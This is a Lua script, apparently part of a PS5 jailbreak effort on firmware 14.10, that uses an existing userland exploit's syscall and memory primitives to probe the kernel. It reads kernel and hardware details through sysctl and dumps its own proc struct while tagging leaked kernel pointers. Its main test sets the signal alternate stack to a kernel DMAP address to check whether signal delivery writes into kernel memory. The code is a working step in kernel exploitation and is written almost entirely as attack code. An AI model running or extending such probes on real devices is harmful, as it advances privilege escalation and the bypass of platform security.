-- 14.10 Recon Probe 24: sigaltstack kernel write attempt + sysctl fix
-- PLAN:
-- Part 1: Fix sysctl to actually read kernel info
-- Part 2: Set altstack to USERLAND buffer, trigger SIGSEGV via handler,
--         verify signal frame is written (baseline)
-- Part 3: Set altstack to kernel address, trigger SIGSEGV,
--         check if process survives (copyout would fail gracefully)
-- Part 4: If we survive, check what happened — did kernel kill us,
--         did it write, or did copyout just return EFAULT?

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: SIGALT KWRITE ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_sigprocmask = 340,
    sc_kill = 37,
    sc_getpid = 20,
    sc_close = 6,
    sc_write = 4,
    sc_mmap = 477,
    sc_munmap = 73,
    sc_sysctl = 202,
    sc_socketpair = 135,
})

-- ============================================================
-- PART 1: sysctl — FIXED
-- The issue: passing any non-zero newp makes kernel think we're
-- writing. Must find a way to pass "no new value".
-- Try: large dummy ptr (not 0, not 1) with newlen=0
-- Or: use the actual memory.alloc ptr but set newlen=0
-- ============================================================
log("")
log("--- PART 1: sysctl info ---")

local mib = memory.alloc(32)
local val = memory.alloc(4096)
local vallen = memory.alloc(8)
-- For newp: allocate a real buffer but pass newlen=0
-- This should tell kernel "I have no new data"
local newp_buf = memory.alloc(64)

local function do_sysctl(m1, m2, miblen, label)
    memory.write_dword(mib, m1)
    memory.write_dword(mib + 4, m2)
    memory.write_qword(vallen, 4090)
    for i = 0, 511, 8 do memory.write_qword(val + i, 0) end

    local s_ok, s_ret = pcall(function()
        -- sysctl(mib, miblen, old, oldlen, new, newlen)
        -- key: newlen MUST be 0 for read-only
        return syscall.sc_sysctl(mib, miblen, val, vallen, newp_buf, 0)
    end)

    if not s_ok then
        log(string.format("  %-22s FAIL: %s", label, tostring(s_ret):sub(1, 30)))
        return
    end

    local rv = s_ret:tonumber()
    local actual_len = memory.read_qword(vallen):tonumber()

    if rv ~= 0 then
        log(string.format("  %-22s rv=%d", label, rv))
        return
    end

    if actual_len > 0 and actual_len <= 4090 then
        local b0 = memory.read_byte(val):tonumber()
        if b0 >= 32 and b0 < 127 then
            local str = {}
            for i = 0, math.min(actual_len - 1, 200) do
                local b = memory.read_byte(val + i):tonumber()
                if b >= 32 and b < 127 then str[#str + 1] = string.char(b)
                elseif b == 0 then break
                else str[#str + 1] = "." end
            end
            log(string.format("  %-22s \"%s\"", label, table.concat(str):sub(1, 120)))
        elseif actual_len <= 8 then
            local lo = memory.read_dword(val):tonumber()
            local hi = memory.read_dword(val + 4):tonumber()
            if actual_len <= 4 then
                log(string.format("  %-22s %d (0x%x)", label, lo, lo))
            else
                log(string.format("  %-22s 0x%08x%08x", label, hi, lo))
            end
        else
            log(string.format("  %-22s len=%d (binary)", label, actual_len))
        end
    else
        log(string.format("  %-22s len=%d rv=%d", label, actual_len, rv))
    end
end

-- Standard FreeBSD sysctl MIBs
do_sysctl(1, 1, 2, "kern.ostype")        -- CTL_KERN=1, KERN_OSTYPE=1
do_sysctl(1, 2, 2, "kern.osrelease")     -- KERN_OSRELEASE=2
do_sysctl(1, 4, 2, "kern.version")       -- KERN_VERSION=4
do_sysctl(1, 24, 2, "kern.osreldate")    -- KERN_OSRELDATE=24
do_sysctl(1, 27, 2, "kern.hostname")     -- KERN_HOSTNAME=27
do_sysctl(1, 14, 2, "kern.usrstack")     -- KERN_USRSTACK=14
do_sysctl(1, 33, 2, "kern.ps_strings")   -- KERN_PS_STRINGS=33
do_sysctl(6, 1, 2, "hw.machine")         -- CTL_HW=6, HW_MACHINE=1
do_sysctl(6, 2, 2, "hw.model")           -- HW_MODEL=2
do_sysctl(6, 3, 2, "hw.ncpu")            -- HW_NCPU=3
do_sysctl(6, 5, 2, "hw.physmem")         -- HW_PHYSMEM=5
do_sysctl(6, 11, 2, "hw.pagesize")       -- HW_PAGESIZE=11

-- ============================================================
-- PART 2: Baseline — signal frame on userland altstack
-- Set handler for SIGUSR1 (30) to the existing crash handler
-- address, set altstack to user buffer, send SIGUSR1
-- ============================================================
log("")
log("--- PART 2: baseline signal frame ---")

local SA_SIZE = 64
local SS_SIZE = 32
local STACK_SZ = 32768
local SA_ONSTACK = 0x0001
local SA_SIGINFO = 0x0040
local SS_DISABLE = 4

local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(SS_SIZE)
local ss_old = memory.alloc(SS_SIZE)

-- Allocate and fill user altstack with unique pattern per qword
local user_stack = memory.alloc(STACK_SZ)
for i = 0, STACK_SZ - 1, 8 do
    -- Write offset as pattern so we can see exactly where frame lands
    memory.write_dword(user_stack + i, 0xBBBB0000 + (i % 0x10000))
    memory.write_dword(user_stack + i + 4, 0xBBBBBBBB)
end

-- Set altstack to user buffer
memory.write_qword(ss_new, user_stack)
memory.write_qword(ss_new + 8, STACK_SZ)
memory.write_dword(ss_new + 16, 0)

local ss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
log("  set user altstack: " .. (ss_ok and "OK" or "FAIL"))

-- Get current SIGUSR1 handler
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_old + i, 0) end
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_qword(sa_new, 1) -- SIG_IGN temp
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
-- Restore original
pcall(function() syscall.sc_sigaction(30, sa_old, sa_new) end)

local handler_lo = memory.read_dword(sa_old):tonumber()
local handler_hi = memory.read_dword(sa_old + 4):tonumber()
log(string.format("  SIGUSR1 handler: 0x%08x%08x", handler_hi, handler_lo))

-- Set SIGUSR1 to SIG_IGN with SA_ONSTACK to test frame delivery
-- Actually SIG_IGN won't build a frame... we need a REAL handler
-- The crash handler at 0x533118f4 IS a real handler
-- Set it with SA_ONSTACK | SA_SIGINFO
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
memory.write_dword(sa_new, 0x533118f4)
memory.write_dword(sa_new + 4, 0)
memory.write_dword(sa_new + 8, SA_ONSTACK + SA_SIGINFO) -- flags

local siga_ok = pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
log("  set SIGUSR1 handler+ONSTACK: " .. (siga_ok and "OK" or "FAIL"))

-- Send SIGUSR1 to self
local pid = syscall.sc_getpid():tonumber()
log("  sending SIGUSR1 to self (pid=" .. pid .. ")...")

local kill_ok, kill_ret = pcall(function()
    return syscall.sc_kill(pid, 30)
end)
log("  kill: " .. (kill_ok and "rv=" .. kill_ret:tonumber() or "ERR"))

-- Check altstack for modifications
local frame_start = -1
local frame_end = -1
local kptrs_found = 0
local frame_data = {}

for i = 0, STACK_SZ - 8, 8 do
    local lo = memory.read_dword(user_stack + i):tonumber()
    local hi = memory.read_dword(user_stack + i + 4):tonumber()
    local expected_lo = 0xBBBB0000 + (i % 0x10000)
    local expected_hi = 0xBBBBBBBB

    if lo ~= expected_lo or hi ~= expected_hi then
        if frame_start < 0 then frame_start = i end
        frame_end = i + 8

        if hi >= 0xFFFF0000 then
            kptrs_found = kptrs_found + 1
        end

        if #frame_data < 80 then
            frame_data[#frame_data + 1] = {off = i, lo = lo, hi = hi}
        end
    end
end

log(string.format("  frame: start=0x%x end=0x%x size=%d bytes",
    frame_start >= 0 and frame_start or 0,
    frame_end >= 0 and frame_end or 0,
    frame_end - frame_start))
log("  kernel pointers in frame: " .. kptrs_found)

if #frame_data > 0 then
    log("  frame dump:")
    for _, d in ipairs(frame_data) do
        local tag = ""
        if d.hi >= 0xFFFFFFFF and d.lo >= 0x80000000 then tag = " [KTEXT]"
        elseif d.hi >= 0xFFFFF800 and d.hi < 0xFFFFFF00 then tag = " [DMAP]"
        elseif d.hi >= 0xFFFF0000 then tag = " [KHIGH]" end
        log(string.format("    +%04x: 0x%08x%08x%s", d.off, d.hi, d.lo, tag))
    end
end

-- Disable altstack
memory.write_dword(ss_new + 16, SS_DISABLE)
pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

-- Restore SIGUSR1 to DFL
for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

-- ============================================================
-- PART 3: Kernel address altstack test
-- Set altstack to a kernel address, trigger signal
-- copyout() in sendsig() should fail with EFAULT
-- The kernel should then SIGSEGV the process (which we handle)
-- or just fail gracefully
-- ============================================================
log("")
log("--- PART 3: kernel altstack test ---")

-- Only do this if Part 2 showed signal frames work
if frame_start >= 0 then
    log("  signal frames confirmed working")

    -- Step 1: Set altstack to kernel DMAP address
    -- DMAP is writable in kernel context, so if copyout doesn't
    -- check the destination, it would write there
    local KADDR_HI = 0xFFFFF800
    local KADDR_LO = 0x10000000  -- DMAP + 256MB (likely valid RAM)

    memory.write_dword(ss_new, KADDR_LO)
    memory.write_dword(ss_new + 4, KADDR_HI)
    memory.write_qword(ss_new + 8, STACK_SZ)
    memory.write_dword(ss_new + 16, 0)

    local kss_ok = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
    log(string.format("  set kernel altstack 0x%08x%08x: %s",
        KADDR_HI, KADDR_LO, kss_ok and "OK" or "FAIL"))

    if kss_ok then
        -- Verify it was set
        local verify_ss = memory.alloc(SS_SIZE)
        memory.write_dword(ss_new + 16, SS_DISABLE) -- query via disable
        pcall(function() syscall.sc_sigaltstack(ss_new, verify_ss) end)
        local vsp_lo = memory.read_dword(verify_ss):tonumber()
        local vsp_hi = memory.read_dword(verify_ss + 4):tonumber()
        log(string.format("  verify altstack: 0x%08x%08x", vsp_hi, vsp_lo))

        -- Re-enable with kernel address
        memory.write_dword(ss_new, KADDR_LO)
        memory.write_dword(ss_new + 4, KADDR_HI)
        memory.write_qword(ss_new + 8, STACK_SZ)
        memory.write_dword(ss_new + 16, 0)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

        -- Set SIGUSR2 (31) with SA_ONSTACK + the crash handler
        for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
        memory.write_dword(sa_new, 0x533118f4)
        memory.write_dword(sa_new + 4, 0)
        memory.write_dword(sa_new + 8, SA_ONSTACK + SA_SIGINFO)

        pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)

        -- Block SIGUSR2 first so we can unblock and catch
        -- Actually just send it directly
        log("  sending SIGUSR2 with kernel altstack...")

        local k_kill_ok, k_kill_ret = pcall(function()
            return syscall.sc_kill(pid, 31)
        end)
        log("  kill(SIGUSR2): " ..
            (k_kill_ok and "rv=" .. k_kill_ret:tonumber() or "CRASH: " .. tostring(k_kill_ret):sub(1, 50)))

        -- If we're still alive, the kernel handled it somehow
        local alive = pcall(function() return syscall.sc_getpid() end)
        log("  alive after kernel altstack signal: " .. tostring(alive))

        if alive then
            log("  *** SURVIVED! Kernel either:")
            log("      1. copyout() failed EFAULT and signal was dropped")
            log("      2. copyout() wrote to kernel memory (!!)")
            log("      3. SA_ONSTACK was ignored")

            -- Check: is the altstack still set?
            local check_ss = memory.alloc(SS_SIZE)
            memory.write_dword(ss_new + 16, SS_DISABLE)
            pcall(function() syscall.sc_sigaltstack(ss_new, check_ss) end)
            local csp_lo = memory.read_dword(check_ss):tonumber()
            local csp_hi = memory.read_dword(check_ss + 4):tonumber()
            local cfl = memory.read_dword(check_ss + 16):tonumber()
            log(string.format("  altstack after: sp=0x%08x%08x flags=0x%x",
                csp_hi, csp_lo, cfl))
        end

        -- Disable altstack
        memory.write_dword(ss_new + 16, SS_DISABLE)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

        -- Restore signal
        for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
        pcall(function() syscall.sc_sigaction(31, sa_new, sa_old) end)
    end
else
    log("  no signal frame in Part 2 — skipping kernel test")
end

-- ============================================================
-- PART 4: Additional sysctl scan for PS5-specific info
-- Try 3-level MIBs and known FreeBSD entries
-- ============================================================
log("")
log("--- PART 4: sysctl deep scan ---")

-- kern.proc.pid (CTL_KERN=1, KERN_PROC=14, KERN_PROC_PID=1)
-- This might give us our own proc struct info
memory.write_dword(mib, 1)      -- CTL_KERN
memory.write_dword(mib + 4, 14) -- KERN_PROC
memory.write_dword(mib + 8, 1)  -- KERN_PROC_PID
memory.write_dword(mib + 12, pid) -- our PID
memory.write_qword(vallen, 4090)
for i = 0, 511, 8 do memory.write_qword(val + i, 0) end

local proc_ok, proc_ret = pcall(function()
    return syscall.sc_sysctl(mib, 4, val, vallen, newp_buf, 0)
end)
if proc_ok then
    local plen = memory.read_qword(vallen):tonumber()
    log(string.format("  kern.proc.pid.%d: len=%d rv=%d", pid, plen, proc_ret:tonumber()))

    if plen > 0 and plen <= 4090 then
        -- Dump first 256 bytes looking for interesting data
        log("  proc struct dump:")
        for i = 0, math.min(plen - 1, 255), 8 do
            local lo = memory.read_dword(val + i):tonumber()
            local hi = memory.read_dword(val + i + 4):tonumber()
            if lo ~= 0 or hi ~= 0 then
                local tag = ""
                if hi >= 0xFFFF0000 then tag = " *** KPTR ***" end
                -- Check for strings
                local is_str = true
                for j = 0, 7 do
                    local b = memory.read_byte(val + i + j):tonumber()
                    if b ~= 0 and (b < 32 or b >= 127) then is_str = false end
                end
                if is_str and lo > 0 then
                    local s = ""
                    for j = 0, 7 do
                        local b = memory.read_byte(val + i + j):tonumber()
                        if b >= 32 and b < 127 then s = s .. string.char(b) end
                    end
                    if #s > 2 then tag = tag .. " \"" .. s .. "\"" end
                end
                log(string.format("    +%3d: 0x%08x%08x%s", i, hi, lo, tag))
            end
        end
    end
else
    log("  kern.proc.pid: " .. tostring(proc_ret):sub(1, 50))
end

-- Try some more sysctl
do_sysctl(1, 35, 2, "kern.maxproc")
do_sysctl(1, 6, 2, "kern.ngroups")
do_sysctl(1, 10, 2, "kern.maxvnodes")

log("")
log("=== SIGALT KWRITE DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
